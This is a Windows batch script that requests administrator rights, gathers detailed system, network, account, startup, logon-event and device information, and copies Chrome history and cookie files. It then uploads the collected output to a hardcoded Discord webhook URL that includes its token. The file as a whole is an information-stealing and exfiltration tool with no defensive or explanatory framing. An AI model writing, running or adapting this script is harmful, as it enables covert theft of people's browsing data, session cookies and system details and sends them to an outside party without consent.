@echo off
NET SESSION >nul 2>nul
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c, %~s0' -Verb runAs"
    exit
)

echo Collecting network information...
netstat -ano | findstr LISTEN >> output.txt
ipconfig /all >> output.txt
systeminfo >> output.txt
systeminfo | find "System Boot Time" >> output.txt
tasklist >> output.txt
wmic path Win32_Keyboard get Description, DeviceID >> output.txt
wmic path Win32_PointingDevice get Description, DeviceID >> output.txt
wmic printer get Name, PortName, DeviceID >> output.txt
wmic path Win32_USBHub get DeviceID, PNPDeviceID >> output.txt

echo Collecting hardware information...
wmic cpu get Caption, DeviceID, NumberOfCores, NumberOfLogicalProcessors >> output.txt
wmic memorychip get Capacity, Speed >> output.txt
wmic diskdrive get Model, Size, MediaType >> output.txt
wmic path Win32_VideoController get Caption, VideoProcessor, AdapterRAM >> output.txt
wmic baseboard get Product, Manufacturer, SerialNumber >> output.txt

echo Collecting security information...
wmic path Win32_OperatingSystem get RegisteredUser, Organization >> output.txt
wmic startup get Caption, Command, User >> output.txt
wmic useraccount get Name, Disabled >> output.txt

echo Collecting login history...
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:10 >> output.txt

echo Collecting browser history...
copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\History" "C:\path\to\save\chrome_history\History" >> output.txt
copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "C:\path\to\save\chrome_history\Cookies" >> output.txt

curl -X POST -H "Content-Type: multipart/form-data" ^
    -F "file=@output.txt" ^
    -F "payload_json={\"content\":\"The system information is attached.\"}" ^
    "https://discord.com/api/webhooks/1331130715756302398/0krYI_M-et4ykQSqHX3E4DfPsTA7yF9sZykcG8H3llbfhuvfbb2imilAmtyeMGcFpvZb"

pause
